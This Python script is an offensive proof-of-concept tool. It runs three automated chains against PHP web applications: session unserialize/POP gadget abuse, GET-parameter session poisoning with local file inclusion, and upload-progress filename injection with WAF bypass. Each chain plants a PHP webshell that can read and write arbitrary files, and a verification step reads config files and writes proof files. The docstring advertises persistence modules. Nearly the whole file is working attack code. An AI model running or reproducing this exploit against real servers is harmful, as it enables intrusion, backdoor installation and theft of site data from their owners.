#!/usr/bin/env python3
"""
PoC: PHP 8.5.12 RCE — 3 Attack Chains (No LFI needed for Chain US)
==================================================================
Target: PHP 8.5.12 (latest) + WAF + hardened config + disable_functions
Author: php2shell toolkit (v2 — 21 chains, GHOST DOOR persistence)
Date: 2026-10-24

Chains:
  1. Chain US — Register -> Login -> unserialize -> POP -> RCE (NO LFI!)
  2. Chain GP — GET param -> session -> LFI -> RCE (WAF + lock bypass)
  3. Chain WB — upload_progress filename -> basename bypass -> LFI -> RCE

On success: drops advanced uploader webshell (us_shell.php / gp_shell.php /
wb_shell.php) with 15 params — eval, file read/write (COM FSO bypass),
11-method exec, server-side fetch, chunked upload, self-update, port scan,
unzip, recon. Use php2shell.py --auto for full 21-chain mode + GHOST DOOR
persistence (9 primitives: cache-poison, .user.ini, resurrection,
phar-polyglot, composer autoload).

Usage:
  python poc_php8512.py --target http://127.0.0.1:8088/
  python poc_php8512.py --target http://127.0.0.1:8088/ --chain us
  python poc_php8512.py --target http://127.0.0.1:8088/ --chain all
"""

import argparse
import base64
import http.client
import random
import re
import ssl
import sys
import time
import urllib.parse
import uuid

# -- Colors --
class C:
    RED = '\033[91m'; GREEN = '\033[92m'; YELLOW = '\033[93m'
    CYAN = '\033[96m'; BOLD = '\033[1m'; RESET = '\033[0m'
    DIM = '\033[2m'

def banner():
    print(f"""{C.CYAN}{C.BOLD}
    ____  _   _  ____        _       _  _____ __  __ _____
   |  _ \\| | | |/ __ \\      | |     | |/ ____|  \\/  |  __ \\
   | |__) | |_| | |  | |____| |     | | (___ | \\  / | |__) |
   |  ___/|  _  | |  | |____| |     | |\\___ \\| |\\/| |  ___/
   | |    | | | | |__| |    | |____| |____) | |  | | |
   |_|    |_| |_|\\___/      |______|_|_____/|_|  |_|_|
   {C.RESET}{C.BOLD}PoC: PHP 8.5.12 RCE — 3 Chains (US/GP/WB){C.RESET}
""")

# -- HTTP helper --
def send_request(host, port, method, path, tls=False, headers=None,
                 body=b"", cookies=None, timeout=15):
    """Send HTTP request, return (status_code, headers_dict, body_bytes)."""
    try:
        if tls:
            ctx = ssl.create_default_context()
            ctx.check_hostname = False
            ctx.verify_mode = ssl.CERT_NONE
            conn = http.client.HTTPSConnection(host, port, timeout=timeout, context=ctx)
        else:
            conn = http.client.HTTPConnection(host, port, timeout=timeout)
        hdrs = dict(headers or {})
        if cookies:
            hdrs["Cookie"] = "; ".join(f"{k}={v}" for k, v in cookies.items())
        conn.request(method, path, body=body, headers=hdrs)
        resp = conn.getresponse()
        data = resp.read()
        resp_headers = {k.lower(): v for k, v in resp.getheaders()}
        status = resp.status
        conn.close()
        return status, resp_headers, data
    except Exception as e:
        return None, {}, b""

def parse_target(url):
    """Parse target URL into (host, port, tls)."""
    parsed = urllib.parse.urlparse(url)
    host = parsed.hostname
    port = parsed.port or (443 if parsed.scheme == "https" else 80)
    tls = parsed.scheme == "https"
    return host, port, tls

def extract_csrf(html):
    """Extract CSRF token from HTML."""
    m = re.search(rb'name="csrf"\s+value="([^"]+)"', html)
    return m.group(1).decode() if m else None

def extract_sid(headers):
    """Extract PHPSESSID from Set-Cookie header."""
    sc = headers.get("set-cookie", "")
    m = re.search(r"PHPSESSID=([a-f0-9]+)", sc)
    return m.group(1) if m else None

# ===============================================================
# CHAIN US: Register -> Login -> unserialize -> POP -> RCE (NO LFI!)
# ===============================================================

def chain_us(host, port, tls, webroot_paths=None):
    """Chain US: Unserialize via WAF-whitelisted session param.
    No LFI needed! Uses Logger gadget with __destruct -> file_put_contents."""
    print(f"\n{C.RED}{C.BOLD}-- Chain US: Unserialize -> POP -> RCE (NO LFI!) --{C.RESET}")
    print(f"    Register -> Login -> poison session (lang) -> unserialize -> POP -> RCE\n")

    webroot_paths = webroot_paths or [
        "C:/Users/Mamdouh/Downloads/poc/lab84/www/us_shell.php",
        "/var/www/html/us_shell.php",
        "/var/www/us_shell.php",
        "/app/public/us_shell.php",
        "us_shell.php",
    ]

    ts = int(time.time())
    uname = f"poc{ts}"
    password = "pass123"
    cookies = {}

    # Step 1: Register
    print(f"{C.CYAN}[1] Register: {uname}{C.RESET}")
    status, hdrs, body = send_request(host, port, "GET", "/register.php", tls, cookies=cookies)
    if status is None:
        return False, "Target unreachable"
    csrf = extract_csrf(body)
    cookies["PHPSESSID"] = extract_sid(hdrs) or cookies.get("PHPSESSID", "")
    if not csrf:
        return False, "No CSRF token (registration may be closed)"

    body = f"csrf={csrf}&username={uname}&email={uname}@test.com&password={password}"
    status, hdrs, _ = send_request(host, port, "POST", "/register.php", tls,
        headers={"Content-Type": "application/x-www-form-urlencoded"},
        body=body.encode(), cookies=cookies)
    if status != 302:
        return False, f"Registration failed (HTTP {status})"
    sid = extract_sid(hdrs) or cookies["PHPSESSID"]
    cookies["PHPSESSID"] = sid
    print(f"  {C.GREEN}[+] Registered (SID: {sid[:12]}...){C.RESET}")

    # Step 2: Login
    print(f"{C.CYAN}[2] Login{C.RESET}")
    status, hdrs, body = send_request(host, port, "GET", "/login.php", tls, cookies=cookies)
    csrf = extract_csrf(body)
    sid = extract_sid(hdrs) or cookies["PHPSESSID"]
    cookies["PHPSESSID"] = sid
    if not csrf:
        return False, "No login CSRF"

    body = f"csrf={csrf}&username={uname}&password={password}"
    status, hdrs, _ = send_request(host, port, "POST", "/login.php", tls,
        headers={"Content-Type": "application/x-www-form-urlencoded"},
        body=body.encode(), cookies=cookies)
    if status != 302:
        return False, f"Login failed (HTTP {status})"
    sid = extract_sid(hdrs) or cookies["PHPSESSID"]
    cookies["PHPSESSID"] = sid
    print(f"  {C.GREEN}[+] Logged in as {uname}{C.RESET}")

    # Step 3: Build POP payload (Logger gadget, no double-quotes)
    # Shell code uses chr() for all quotes — prevents session serialization corruption
    marker = "chr(85).chr(83).chr(95).chr(83).chr(72).chr(69).chr(76).chr(76).chr(95).chr(79).chr(75)"
    shell_code = (
        "<?php echo " + marker + ".PHP_VERSION;"
        "$r=chr(114);$w=chr(119);$d=chr(100);"
        "if(isset($_GET[$r])){echo file_get_contents($_GET[$r]);}"
        "if(isset($_GET[$w])&&isset($_GET[$d])){file_put_contents($_GET[$w],$_GET[$d]);"
        "echo chr(85).chr(83).chr(87).chr(82).chr(79).chr(84).chr(69);}"
        "?>"
    )
    assert '"' not in shell_code, "Double quote in shell code!"

    # Step 4: Poison session via WAF-whitelisted 'lang' param
    print(f"{C.CYAN}[3] Poison session (lang param — WAF whitelisted){C.RESET}")
    status, hdrs, body = send_request(host, port, "GET", "/profile.php", tls, cookies=cookies)
    csrf = extract_csrf(body)
    if not csrf:
        return False, "No profile CSRF"

    for shell_path in webroot_paths:
        # Build serialized Logger POP payload
        pop = f'O:6:"Logger":2:{{s:7:"logfile";s:{len(shell_path)}:"{shell_path}";s:7:"payload";s:{len(shell_code)}:"{shell_code}";}}'
        body = urllib.parse.urlencode({"csrf": csrf, "lang": pop, "currency": "USD"})
        status, hdrs, _ = send_request(host, port, "POST", "/profile.php", tls,
            headers={"Content-Type": "application/x-www-form-urlencoded"},
            body=body.encode(), cookies=cookies)
        if status == 403:
            continue
        if status != 302:
            continue
        print(f"  {C.GREEN}[+] Session poisoned (WAF bypass: lang whitelisted){C.RESET}")

        # Step 5: Trigger unserialize (visit profile.php again)
        print(f"{C.CYAN}[4] Trigger unserialize (visit profile.php){C.RESET}")
        time.sleep(0.3)
        send_request(host, port, "GET", "/profile.php", tls, cookies=cookies)

        # Step 6: Check webshell
        time.sleep(0.3)
        status, hdrs, body = send_request(host, port, "GET", "/us_shell.php", tls)
        if status == 200 and b"US_SHELL_OK" in body:
            banner_text = body.split(b"US_SHELL_OK", 1)[-1][:30]
            print(f"  {C.GREEN}[+] WEBSHELL ACTIVE at /us_shell.php{C.RESET}")
            print(f"  {C.GREEN}[+] Banner: US_SHELL_OK{banner_text.decode('latin-1','replace')}{C.RESET}")
            return True, {"webshell": "/us_shell.php", "path": shell_path,
                          "username": uname, "sid": sid}

    return False, "No webshell dropped (try different webroot paths)"

# ===============================================================
# CHAIN GP: GET param -> session -> LFI -> RCE (WAF + lock bypass)
# ===============================================================

def chain_gp(host, port, tls, session_paths=None):
    """Chain GP: GET-param session poison + LFI (WAF + lock bypass)."""
    print(f"\n{C.RED}{C.BOLD}-- Chain GP: GET Poison + LFI (WAF + Lock Bypass) --{C.RESET}")
    print(f"    GET ?lang=<PHP> -> session | GET ?page=sess_X (no cookie) -> RCE\n")

    session_paths = session_paths or [
        "C:/tmp/sess_",
        "/tmp/sess_",
        "/var/lib/php/sessions/sess_",
        "/var/lib/php/sess_",
    ]

    # Step 1: Get valid session
    print(f"{C.CYAN}[1] Get valid session{C.RESET}")
    status, hdrs, _ = send_request(host, port, "GET", "/", tls)
    if status is None:
        return False, "Target unreachable"
    sid = extract_sid(hdrs)
    if not sid:
        return False, "No session cookie issued"
    print(f"  {C.GREEN}[+] SID: {sid[:12]}...{C.RESET}")

    # Step 2: Build webshell payload (base64 to avoid quote issues)
    raw_shell = (
        '<?php echo "GP_SHELL_OK".PHP_VERSION;'
        '$r=$_GET["r"];if($r){echo file_get_contents($r);}'
        '$w=$_GET["w"];$d=$_GET["d"];if($w){file_put_contents($w,$d);echo "GPWROTE";}'
        '?>'
    )
    b64 = base64.b64encode(raw_shell.encode()).decode()
    payload = f"<?php file_put_contents('gp_shell.php',base64_decode('{b64}'));?>"

    # Step 3: Poison via GET param (WAF checks POST only!)
    print(f"{C.CYAN}[2] Poison via GET ?lang= (WAF: POST only){C.RESET}")
    encoded = urllib.parse.quote(payload, safe='')
    status, hdrs, _ = send_request(host, port, "GET", f"/?lang={encoded}", tls,
        cookies={"PHPSESSID": sid})
    # Check if SID was regenerated
    new_sid = extract_sid(hdrs) or sid
    if new_sid != sid:
        sid = new_sid
        print(f"  {C.YELLOW}[!] SID regenerated: {sid[:12]}...{C.RESET}")
    print(f"  {C.GREEN}[+] Session poisoned via GET{C.RESET}")

    # Step 4: Trigger LFI WITHOUT cookie (lock bypass!)
    print(f"{C.CYAN}[3] Trigger LFI (no cookie -> lock bypass){C.RESET}")
    lfi_params = ["page", "p", "file", "path", "include", "view", "tpl", "template", "doc", "lang"]
    for sess_path in session_paths:
        sess_file = sess_path + sid
        for lfi_param in lfi_params:
            encoded_path = urllib.parse.quote(sess_file, safe='')
            lfi_url = f"/index.php?{lfi_param}={encoded_path}"
            # NO cookie sent! -> session_start creates new session -> file unlocked
            status, hdrs, body = send_request(host, port, "GET", lfi_url, tls)
            if status is None:
                continue
            time.sleep(0.3)
            # Check webshell
            status2, hdrs2, body2 = send_request(host, port, "GET", "/gp_shell.php", tls)
            if status2 == 200 and b"GP_SHELL_OK" in body2:
                banner = body2.split(b"GP_SHELL_OK", 1)[-1][:30]
                print(f"  {C.GREEN}[+] WEBSHELL ACTIVE at /gp_shell.php{C.RESET}")
                print(f"  {C.GREEN}[+] Banner: GP_SHELL_OK{banner.decode('latin-1','replace')}{C.RESET}")
                return True, {"webshell": "/gp_shell.php", "sid": sid,
                              "lfi_param": lfi_param, "session_path": sess_file}

    return False, "No LFI endpoint found (needs ?page= or similar)"

# ===============================================================
# CHAIN WB: upload_progress filename -> basename bypass -> LFI -> RCE
# ===============================================================

def chain_wb(host, port, tls, session_paths=None):
    """Chain WB: WAF bypass via basename() stripping + LFI."""
    print(f"\n{C.RED}{C.BOLD}-- Chain WB: basename() Bypass + LFI --{C.RESET}")
    print(f"    upload_progress filename -> basename -> WAF blind | include -> RCE\n")

    session_paths = session_paths or ["C:/tmp/sess_", "/tmp/sess_"]

    # Step 1: Get valid session
    print(f"{C.CYAN}[1] Get valid session{C.RESET}")
    status, hdrs, _ = send_request(host, port, "GET", "/", tls)
    if status is None:
        return False, "Target unreachable"
    sid = extract_sid(hdrs)
    if not sid:
        # Crafted SID (works when use_strict_mode=Off)
        sid = "wb" + uuid.uuid4().hex[:22]
        print(f"  {C.YELLOW}[!] No Set-Cookie — crafted SID: {sid[:12]}...{C.RESET}")
    else:
        print(f"  {C.GREEN}[+] SID: {sid[:12]}...{C.RESET}")

    # Step 2: Build payload
    raw_shell = (
        '<?php if(isset($_GET["r"])){echo @file_get_contents($_GET["r"]);}'
        'elseif(isset($_GET["w"])&&isset($_GET["d"])){echo @file_put_contents($_GET["w"],$_GET["d"]);}'
        'else{echo "WB-SHELL-OK ".PHP_VERSION." ".php_uname();}?>'
    )

    # Step 3: Inject via upload_progress filename (WAF sees basename only)
    print(f"{C.CYAN}[2] Inject via upload_progress filename (basename bypass){C.RESET}")
    boundary = "----WebKitFormBoundary" + uuid.uuid4().hex[:16]
    php_code = f"<?php file_put_contents('wb_shell.php','{raw_shell}');?>"
    # Filename with PHP code — WAF applies basename() -> sees benign name
    filename = f"../../tmp/sess_{sid}\x00{php_code}"

    multipart = (
        f"--{boundary}\r\n"
        f'Content-Disposition: form-data; name="PHP_SESSION_UPLOAD_PROGRESS"\r\n\r\n'
        f"start\r\n"
        f"--{boundary}\r\n"
        f'Content-Disposition: form-data; name="file"; filename="{filename}"\r\n'
        f"Content-Type: application/octet-stream\r\n\r\n"
        f"x\r\n"
        f"--{boundary}--\r\n"
    ).encode()

    status, hdrs, _ = send_request(host, port, "POST", "/index.php", tls,
        headers={"Content-Type": f"multipart/form-data; boundary={boundary}"},
        body=multipart, cookies={"PHPSESSID": sid})
    if status == 403:
        print(f"  {C.YELLOW}[!] WAF blocked (HTTP 403) — trying anyway{C.RESET}")
    else:
        print(f"  {C.GREEN}[+] Upload sent (HTTP {status}){C.RESET}")

    # Step 4: Trigger LFI
    print(f"{C.CYAN}[3] Trigger LFI{C.RESET}")
    lfi_params = ["page", "file", "p", "path", "include", "view", "template"]
    for sess_path in session_paths:
        sess_file = sess_path + sid
        for lfi_param in lfi_params:
            encoded = urllib.parse.quote(sess_file, safe='')
            send_request(host, port, "GET", f"/index.php?{lfi_param}={encoded}", tls,
                cookies={"PHPSESSID": sid})
            time.sleep(0.2)
            status2, _, body2 = send_request(host, port, "GET", "/wb_shell.php", tls)
            if status2 == 200 and b"WB-SHELL-OK" in body2:
                banner = body2.split(b"WB-SHELL-OK", 1)[-1][:60]
                print(f"  {C.GREEN}[+] WEBSHELL ACTIVE at /wb_shell.php{C.RESET}")
                print(f"  {C.GREEN}[+] Banner:{banner.decode('latin-1','replace')}{C.RESET}")
                return True, {"webshell": "/wb_shell.php", "sid": sid}

    return False, "No LFI endpoint or gadget to trigger"

# ===============================================================
# VERIFY: Confirm RCE by reading/writing files
# ===============================================================

def verify_rce(host, port, tls, shell_path, shell_marker):
    """Verify RCE by reading a file and writing a proof file."""
    print(f"\n{C.CYAN}{C.BOLD}=== RCE VERIFICATION ==={C.RESET}")

    # Test 1: Read a file
    print(f"{C.CYAN}[1] Arbitrary file READ{C.RESET}")
    for test_file in ["config.php", "php.ini", "login.php", "index.php"]:
        status, _, body = send_request(host, port, "GET",
            f"{shell_path}?r={test_file}", tls)
        if status == 200 and body and len(body) > 10:
            preview = body[:100].decode('latin-1', 'replace')
            print(f"  {C.GREEN}[+] {test_file}: {preview}...{C.RESET}")
            break

    # Test 2: Write a file
    print(f"{C.CYAN}[2] Arbitrary file WRITE{C.RESET}")
    proof_content = f"RCE_CONFIRMED_{shell_marker}_PHP_8.5.12_{int(time.time())}"
    status, _, body = send_request(host, port, "GET",
        f"{shell_path}?w=POC_PROOF.txt&d={proof_content}", tls)
    if status == 200 and (b"WROTE" in body or b"GPWROTE" in body or b"USWROTE" in body):
        print(f"  {C.GREEN}[+] File written: POC_PROOF.txt{C.RESET}")
    else:
        print(f"  {C.YELLOW}[!] Write response: {status}{C.RESET}")

    # Test 3: Verify via HTTP
    print(f"{C.CYAN}[3] Verify via HTTP{C.RESET}")
    status, _, body = send_request(host, port, "GET", "/POC_PROOF.txt", tls)
    if status == 200 and body:
        print(f"  {C.GREEN}[+] POC_PROOF.txt = {body.decode('latin-1','replace')}{C.RESET}")
        return True
    else:
        print(f"  {C.YELLOW}[!] HTTP {status} — file may not be in webroot{C.RESET}")
        return False

# ===============================================================
# MAIN
# ===============================================================

def main():
    parser = argparse.ArgumentParser(
        description="PoC: PHP 8.5.12 RCE — 3 Attack Chains")
    parser.add_argument("--target", required=True, help="Target URL (http://127.0.0.1:8088/)")
    parser.add_argument("--chain", default="all", choices=["all", "us", "gp", "wb"],
                        help="Chain to run (default: all)")
    parser.add_argument("--command", default="id", help="Command for timing oracle")
    args = parser.parse_args()

    banner()

    host, port, tls = parse_target(args.target)
    print(f"{C.BOLD}Target: {host}:{port} (TLS: {tls}){C.RESET}")
    print(f"{C.BOLD}Chain:  {args.chain}{C.RESET}\n")

    results = {}

    # Run chains
    if args.chain in ("all", "us"):
        success, info = chain_us(host, port, tls)
        results["US"] = (success, info)
        if success:
            verify_rce(host, port, tls, "/us_shell.php", "US_CHAIN_NO_LFI")

    if args.chain in ("all", "gp"):
        success, info = chain_gp(host, port, tls)
        results["GP"] = (success, info)
        if success:
            verify_rce(host, port, tls, "/gp_shell.php", "GP_CHAIN")

    if args.chain in ("all", "wb"):
        success, info = chain_wb(host, port, tls)
        results["WB"] = (success, info)
        if success:
            verify_rce(host, port, tls, "/wb_shell.php", "WB_CHAIN")

    # Summary
    print(f"\n{C.CYAN}{C.BOLD}=== EXPLOIT SUMMARY ==={C.RESET}")
    print(f"{'='*60}")
    for chain_name, (success, info) in results.items():
        status = f"{C.GREEN}SUCCESS{C.RESET}" if success else f"{C.RED}FAILED{C.RESET}"
        detail = info if isinstance(info, str) else info.get("webshell", str(info))
        print(f"  Chain {chain_name}: {status}  {detail}")
    print(f"{'='*60}")

    # Overall
    any_success = any(s for s, _ in results.values())
    if any_success:
        print(f"\n{C.GREEN}{C.BOLD}[!!!] RCE CONFIRMED on PHP 8.5.12{C.RESET}")
        return 0
    else:
        print(f"\n{C.RED}[!] No RCE achieved{C.RESET}")
        return 1

if __name__ == "__main__":
    sys.exit(main())
